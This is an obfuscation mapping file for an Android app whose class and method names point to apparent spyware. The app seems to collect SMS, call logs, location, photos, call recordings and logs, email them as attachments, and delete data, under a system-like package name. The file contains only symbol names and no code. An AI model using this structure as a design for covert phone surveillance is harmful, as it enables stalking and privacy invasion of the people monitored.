com.android.db.AllDataMailBody -> com.android.a.a:
    java.lang.String body -> a
    java.lang.String bodyend -> b
    android.content.Context context -> c
    java.util.List lsms -> d
    java.util.List lcall -> e
    java.util.List lloc -> f
    java.util.List lphoto -> g
    java.util.List lrecord -> h
    java.util.List llog -> i
    javax.mail.Multipart getMultipart() -> a
    boolean DeleteData() -> b
    void SetFujian(javax.mail.Multipart) -> a
    java.lang.String GetSmsCon(java.util.List) -> a
    java.lang.String GetCallCon(java.util.List) -> b
    java.lang.String GetlocationCon(java.util.List) -> c
    java.lang.String GetPhotoCon(java.util.List) -> d
    java.lang.String GetRecordCon(java.util.List) -> e
    java.lang.String GetLogCon(java.util.List) -> f
com.android.db.CallConten -> com.android.a.b:
    int id -> a
    android.content.Context context -> b
    android.os.Handler handler -> c
    com.android.sound.PhoneRecord phonerecord -> d
    void onChange(boolean) -> onChange
    void init() -> a
    void setPhonerecord(com.android.sound.PhoneRecord) -> a
com.android.db.MailBody -> com.android.a.c:
    javax.mail.Multipart getMultipart() -> a
    boolean DeleteData() -> b
com.android.db.PhoneMailBody -> com.android.a.d:
    java.lang.String body -> a
    java.lang.String bodyend -> b
    android.content.Context context -> c
    java.util.List lphone -> d
    javax.mail.Multipart getMultipart() -> a
    boolean DeleteData() -> b
    java.lang.String GetPhoneCon(java.util.List) -> a
com.android.db.PhotoRecordMailBody -> com.android.a.e:
    java.lang.String body -> a
    java.lang.String bodyend -> b
    android.content.Context context -> c
    java.util.List lphoto -> d
    java.util.List lrecord -> e
    java.util.List lloc -> f
    javax.mail.Multipart getMultipart() -> a
    boolean DeleteData() -> b
    void SetFujian(javax.mail.Multipart) -> a
    java.lang.String GetPhotoCon(java.util.List) -> a
    java.lang.String GetRecordCon(java.util.List) -> b
    java.lang.String GetlocationCon(java.util.List) -> c
com.android.db.SMSConten -> com.android.a.f:
    int id -> a
    android.content.Context context -> b
    android.os.Handler handler -> c
    void onChange(boolean) -> onChange
    void init() -> a
com.android.db.SqlUtils -> com.android.a.g:
    java.lang.String name -> a
    com.android.db.SqlUtils sqlutils -> b
    android.content.Context context -> c
    java.lang.String[] PHONES_PROJECTION -> d
    com.android.db.SqlUtils getinstance(android.content.Context) -> a
